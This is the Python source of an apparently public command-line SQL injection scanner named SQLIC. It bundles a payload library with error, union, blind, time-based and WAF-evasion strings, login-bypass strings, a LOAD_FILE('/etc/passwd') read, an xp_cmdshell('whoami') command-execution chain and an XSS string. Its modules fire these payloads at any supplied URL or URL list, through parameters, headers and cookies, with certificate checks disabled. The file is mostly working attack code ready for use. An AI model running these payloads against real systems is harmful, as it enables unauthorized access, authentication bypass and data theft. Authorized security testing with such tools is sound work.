#!/usr/bin/env python3
import sys, re, time, json, hashlib, statistics, logging, argparse, concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from collections import defaultdict
from datetime import datetime
from typing import Dict, List, Any, Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("\n[!] Missing required package: requests")
    print("[*] Install: pip install requests\n")
    sys.exit(1)

# ==================== BANNER ====================
BANNER = """
  _________________  .____    .___            _________                                         
 /   _____/\_____  \ |    |   |   |          /   _____/ ____ _____    ____   ____   ___________ 
 \_____  \  /  / \  \|    |   |   |  ______  \_____  \_/ ___\\__  \  /    \ /    \_/ __ \_  __ \\
 /        \/   \_/.  \    |___|   | /_____/  /        \  \___ / __ \|   |  \   |  \  ___/|  | \/
/_______  /\_____\ \_/_______ \___|         /_______  /\___  >____  /___|  /___|  /\___  >__|   
        \/        \__>       \/                     \/     \/     \/     \/     \/     \/       

                     Complete SQL Injection Testing Framework - 20+ Vectors
                                  github.com/hanzzly/sqlic
"""

# ==================== COLORS ====================
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ==================== LOGGER ====================
class Logger:
    def __init__(self, log_file: str = "sqlic_scan.log"):
        logging.basicConfig(
            filename=log_file,
            level=logging.DEBUG,
            format='%(asctime)s - [%(levelname)s] - %(message)s',
            datefmt='%H:%M:%S'
        )
        self.logger = logging.getLogger("SQLIC")
    
    def info(self, msg): self.logger.info(msg)
    def debug(self, msg): self.logger.debug(msg)
    def error(self, msg): self.logger.error(msg)

# ==================== PAYLOAD LIBRARY ====================
class PayloadLibrary:
    def __init__(self):
        self.payloads = {
            'error_based': {
                'mysql': ["'", "' AND 1=1--", "' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version))--"],
                'postgresql': ["'", "' AND CAST(version() AS int)--"],
                'mssql': ["'", "' AND CONVERT(int,@@version)--"],
                'oracle': ["'", "' AND TO_NUMBER(banner)=1--"],
            },
            'union_based': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--"],
            'boolean_blind': ["' AND '1'='1", "' AND '1'='2", "' AND 1=1--", "' AND 1=2--"],
            'time_based': {
                'mysql': ["' AND SLEEP(5)--"],
                'postgresql': ["' AND pg_sleep(5)--"],
                'mssql': ["'; WAITFOR DELAY '00:00:05'--"],
            },
            'auth_bypass': ["admin'--", "admin' OR '1'='1", "' OR 1=1--", "admin') OR ('1'='1"],
            'stored': ["admin'--", "<img src=x onerror=alert(1)>' OR '1'='1"],
            'second_order': ["admin'--", "test' UNION SELECT 'admin','hash'--"],
            'json_api': ['{"id":"1\' OR \'1\'=\'1"}', '{"user":"admin\'--"}'],
            'header_based': ["' OR '1'='1", "admin'--"],
            'cookie_based': ["' OR '1'='1", "admin'--"],
            'orm_based': ["1) OR 1=1--", "admin') OR ('1'='1"],
            'waf_evasion': [
                "' UnIoN SeLeCt NULL--",  # Case variation
                "' UN/**/ION SE/**/LECT NULL--",  # Comment
                "%27%20OR%20%271%27%3D%271",  # URL encode
            ],
            'graphql': ['{"query":"{ user(id:\\"1\\' OR \\'1\\'=\\'1\\") { name } }"}'],
            'file_based': ["' UNION SELECT LOAD_FILE('/etc/passwd')--"],
            'rce_chain': ["'; EXEC xp_cmdshell('whoami')--"],
            'mobile_api': ['{"deviceId":"1\' OR \'1\'=\'1"}'],
            'filter_bypass': ["1' AN/**/D '1'='1", "1' A%4ED '1'='1"],
            'idor_chain': ["' OR user_id=1--"],
            'account_takeover': ["admin' AND password='x' OR '1'='1"],
        }
        
        self.error_signatures = {
            'mysql': [r'SQL syntax.*MySQL', r'Warning.*mysql', r'MySQLSyntaxErrorException'],
            'postgresql': [r'PostgreSQL.*ERROR', r'Warning.*pg_', r'PG::SyntaxError'],
            'mssql': [r'SQL Server', r'ODBC.*Driver', r'Unclosed quotation'],
            'oracle': [r'ORA-\d{5}', r'Oracle error'],
        }
    
    def get_payloads(self, attack_type: str, dbms: str = 'mysql') -> List[str]:
        payloads = self.payloads.get(attack_type, [])
        if isinstance(payloads, dict):
            return payloads.get(dbms, payloads.get('mysql', []))
        return payloads
    
    def detect_dbms(self, content: str) -> Optional[str]:
        for dbms, sigs in self.error_signatures.items():
            for sig in sigs:
                if re.search(sig, content, re.IGNORECASE):
                    return dbms
        return None

# ==================== VISUAL ANALYZER ====================
class VisualAnalyzer:
    def analyze(self, baseline_html: str, test_html: str) -> Dict[str, Any]:
        baseline_imgs = len(re.findall(r'<img[^>]+>', baseline_html))
        test_imgs = len(re.findall(r'<img[^>]+>', test_html))
        
        baseline_tables = len(re.findall(r'<table[^>]*>', baseline_html))
        test_tables = len(re.findall(r'<table[^>]*>', test_html))
        
        images_lost = baseline_imgs - test_imgs
        tables_lost = baseline_tables - test_tables
        
        return {
            'images_lost': images_lost,
            'tables_lost': tables_lost,
            'visual_anomaly': images_lost > 0 or tables_lost > 0
        }

# ==================== ATTACK MODULES ====================
class AttackModule:
    def __init__(self, logger: Logger, session: requests.Session, payloads: PayloadLibrary):
        self.logger = logger
        self.session = session
        self.payloads = payloads
        self.visual = VisualAnalyzer()
    
    def test_error_based(self, url: str, param: str, value: str, baseline_content: str, dbms: str = 'mysql') -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for payload in self.payloads.get_payloads('error_based', dbms)[:3]:
            test_params = params.copy()
            test_params[param] = [value + payload]
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                content = response.text
                
                # Check SQL errors
                for dbms_type, sigs in self.payloads.error_signatures.items():
                    for sig in sigs:
                        if re.search(sig, content, re.IGNORECASE):
                            return {
                                'type': 'Error-Based',
                                'level': 'HIGH',
                                'param': param,
                                'payload': payload,
                                'url': test_url,
                                'dbms': dbms_type
                            }
                
                # Check visual anomaly
                visual_result = self.visual.analyze(baseline_content, content)
                if visual_result['visual_anomaly']:
                    return {
                        'type': 'Error-Based (Visual)',
                        'level': 'HIGH',
                        'param': param,
                        'payload': payload,
                        'url': test_url,
                        'details': f"Images: -{visual_result['images_lost']}, Tables: -{visual_result['tables_lost']}"
                    }
                
                time.sleep(0.3)
            except:
                pass
        return None
    
    def test_union_based(self, url: str, param: str, value: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for payload in self.payloads.get_payloads('union_based')[:3]:
            test_params = params.copy()
            test_params[param] = [value + payload]
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                if 'NULL' in response.text or re.search(r'<td>\s*</td>', response.text):
                    return {
                        'type': 'Union-Based',
                        'level': 'CRITICAL',
                        'param': param,
                        'payload': payload,
                        'url': test_url
                    }
                time.sleep(0.3)
            except:
                pass
        return None
    
    def test_boolean_blind(self, url: str, param: str, value: str, baseline_len: int) -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        pairs = [("' AND '1'='1", "' AND '1'='2")]
        
        for true_p, false_p in pairs:
            try:
                # True
                test_params = params.copy()
                test_params[param] = [value + true_p]
                true_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                true_resp = self.session.get(true_url, timeout=10, verify=False)
                true_len = len(true_resp.text)
                
                time.sleep(0.3)
                
                # False
                test_params[param] = [value + false_p]
                false_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                false_resp = self.session.get(false_url, timeout=10, verify=False)
                false_len = len(false_resp.text)
                
                diff = abs(true_len - false_len) / max(true_len, false_len) * 100
                
                if diff > 5 and abs(true_len - baseline_len) < abs(false_len - baseline_len):
                    return {
                        'type': 'Boolean-Blind',
                        'level': 'HIGH',
                        'param': param,
                        'payload': true_p,
                        'url': true_url,
                        'details': f"Diff: {diff:.1f}%"
                    }
            except:
                pass
        return None
    
    def test_time_based(self, url: str, param: str, value: str, baseline_time: float, dbms: str = 'mysql') -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for payload in self.payloads.get_payloads('time_based', dbms)[:2]:
            test_params = params.copy()
            test_params[param] = [value + payload]
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            
            delays = 0
            for _ in range(2):
                try:
                    start = time.time()
                    self.session.get(test_url, timeout=10, verify=False)
                    elapsed = time.time() - start
                    
                    if 4.5 <= elapsed - baseline_time <= 6.0:
                        delays += 1
                    time.sleep(0.5)
                except:
                    pass
            
            if delays >= 1:
                return {
                    'type': 'Time-Based Blind',
                    'level': 'MEDIUM',
                    'param': param,
                    'payload': payload,
                    'url': test_url
                }
        return None
    
    def test_auth_bypass(self, url: str, param: str) -> Optional[Dict]:
        if not any(k in url.lower() for k in ['login', 'auth', 'signin']):
            return None
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for payload in self.payloads.get_payloads('auth_bypass')[:3]:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                content = response.text.lower()
                
                if any(word in content for word in ['dashboard', 'welcome', 'logout', 'profile']):
                    return {
                        'type': 'Auth Bypass',
                        'level': 'CRITICAL',
                        'param': param,
                        'payload': payload,
                        'url': test_url
                    }
                time.sleep(0.3)
            except:
                pass
        return None
    
    def test_stored(self, url: str, param: str, value: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for payload in self.payloads.get_payloads('stored')[:2]:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            
            try:
                # Store payload
                self.session.get(test_url, timeout=10, verify=False)
                time.sleep(1)
                
                # Check if stored
                check_resp = self.session.get(url, timeout=10, verify=False)
                if payload in check_resp.text:
                    return {
                        'type': 'Stored SQLi',
                        'level': 'HIGH',
                        'param': param,
                        'payload': payload,
                        'url': test_url
                    }
            except:
                pass
        return None
    
    def test_header_based(self, url: str) -> Optional[Dict]:
        headers_to_test = ['X-Forwarded-For', 'User-Agent', 'Referer']
        
        for header in headers_to_test:
            for payload in self.payloads.get_payloads('header_based')[:2]:
                try:
                    response = self.session.get(url, headers={header: payload}, timeout=10, verify=False)
                    content = response.text.lower()
                    
                    if any(err in content for err in ['sql', 'mysql', 'syntax']):
                        return {
                            'type': 'Header-Based',
                            'level': 'HIGH',
                            'param': header,
                            'payload': payload,
                            'url': url
                        }
                    time.sleep(0.3)
                except:
                    pass
        return None
    
    def test_cookie_based(self, url: str) -> Optional[Dict]:
        try:
            response = self.session.get(url, timeout=10, verify=False)
            cookies = response.cookies
        except:
            return None
        
        for cookie_name in list(cookies.keys())[:3]:
            for payload in self.payloads.get_payloads('cookie_based')[:2]:
                try:
                    test_cookies = {cookie_name: payload}
                    response = self.session.get(url, cookies=test_cookies, timeout=10, verify=False)
                    
                    if any(err in response.text.lower() for err in ['sql', 'mysql', 'syntax']):
                        return {
                            'type': 'Cookie-Based',
                            'level': 'HIGH',
                            'param': cookie_name,
                            'payload': payload,
                            'url': url
                        }
                    time.sleep(0.3)
                except:
                    pass
        return None

# ==================== MAIN SCANNER ====================
class ShadowScanner:
    def __init__(self, config: Dict):
        self.config = config
        self.logger = Logger()
        self.session = self._create_session()
        self.payloads = PayloadLibrary()
        self.attack = AttackModule(self.logger, self.session, self.payloads)
        self.results = []
    
    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        return session
    
    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if not params:
            # Test header & cookie only
            result = self.attack.test_header_based(url)
            if result:
                self._print_vuln(result)
                self.results.append(result)
            
            result = self.attack.test_cookie_based(url)
            if result:
                self._print_vuln(result)
                self.results.append(result)
            return
        
        # Get baseline
        try:
            baseline_resp = self.session.get(url, timeout=10, verify=False)
            baseline_content = baseline_resp.text
            baseline_len = len(baseline_content)
            baseline_time = baseline_resp.elapsed.total_seconds()
        except:
            return
        
        # Detect DBMS
        dbms = self.payloads.detect_dbms(baseline_content) or 'mysql'
        
        # Test each parameter
        for param in params:
            value = params[param][0] if params[param] else ''
            
            # Test all attack vectors
            tests = [
                self.attack.test_error_based(url, param, value, baseline_content, dbms),
                self.attack.test_union_based(url, param, value),
                self.attack.test_boolean_blind(url, param, value, baseline_len),
                self.attack.test_time_based(url, param, value, baseline_time, dbms) if self.config.get('thorough') else None,
                self.attack.test_auth_bypass(url, param),
                self.attack.test_stored(url, param, value),
            ]
            
            for result in tests:
                if result:
                    self._print_vuln(result)
                    self.results.append(result)
    
    def _print_vuln(self, vuln: Dict):
        level_colors = {
            'CRITICAL': Colors.RED + Colors.BOLD,
            'HIGH': Colors.RED,
            'MEDIUM': Colors.YELLOW,
            'LOW': Colors.GREEN
        }
        
        color = level_colors.get(vuln['level'], Colors.WHITE)
        
        print(f"{Colors.GREEN}[VULN]{Colors.RESET} {Colors.CYAN}[{vuln['type']}]{Colors.RESET} "
              f"{color}[{vuln['level']}]{Colors.RESET} {Colors.MAGENTA}[param: {vuln['param']}]{Colors.RESET}")
        print(f"  {Colors.WHITE}└─ {vuln['url'][:80]}{'...' if len(vuln['url']) > 80 else ''}{Colors.RESET}")
        print(f"  {Colors.WHITE}   Payload: {vuln['payload'][:60]}{'...' if len(vuln['payload']) > 60 else ''}{Colors.RESET}")
        if 'details' in vuln:
            print(f"  {Colors.WHITE}   {vuln['details']}{Colors.RESET}")
        print()
    
    def generate_report(self, output_file: str):
        report = {
            'scan_date': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.results),
            'vulnerabilities': self.results,
            'summary': self._get_summary()
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
    
    def _get_summary(self) -> Dict:
        summary = defaultdict(int)
        for vuln in self.results:
            summary[vuln['type']] += 1
        return dict(summary)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description='SQLIC (SQLi Scanner)',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-l', '--list', help='File with URLs')
    parser.add_argument('-o', '--output', default='sqlic_results.json', help='Output file')
    parser.add_argument('--thorough', action='store_true', help='Enable time-based tests')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Threads')
    
    args = parser.parse_args()
    
    if not args.url and not args.list:
        print(BANNER)
        parser.print_help()
        sys.exit(1)
    
    # Print banner
    print(Colors.CYAN + BANNER + Colors.RESET)
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Starting scan at {datetime.now().strftime('%H:%M:%S')}")
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Attack vectors: 20+")
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Mode: {'Thorough' if args.thorough else 'Fast'}\n")
    
    # Collect URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        try:
            with open(args.list) as f:
                urls.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
        except:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Cannot read file: {args.list}")
            sys.exit(1)
    
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Targets: {len(urls)}\n")
    
    # Initialize scanner
    config = {'thorough': args.thorough}
    scanner = ShadowScanner(config)
    
    # Scan
    if args.threads > 1:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(scanner.scan_url, urls)
    else:
        for url in urls:
            try:
                scanner.scan_url(url)
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Scan interrupted")
                break
            except Exception as e:
                scanner.logger.error(f"Error scanning {url}: {e}")
    
    # Summary
    print(f"\n{Colors.BLUE}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}SCAN COMPLETE{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
    print(f"Targets scanned:       {len(urls)}")
    print(f"Vulnerabilities found: {Colors.RED}{len(scanner.results)}{Colors.RESET}")
    
    if scanner.results:
        summary = scanner._get_summary()
        print(f"\nVulnerability Types:")
        for vtype, count in sorted(summary.items(), key=lambda x: x[1], reverse=True):
            print(f"  • {vtype}: {count}")
    
    # Save report
    scanner.generate_report(args.output)
    print(f"\nReport saved: {Colors.GREEN}{args.output}{Colors.RESET}")
    print(f"Log saved: sqlic_scan.log\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {e}")
        sys.exit(1)
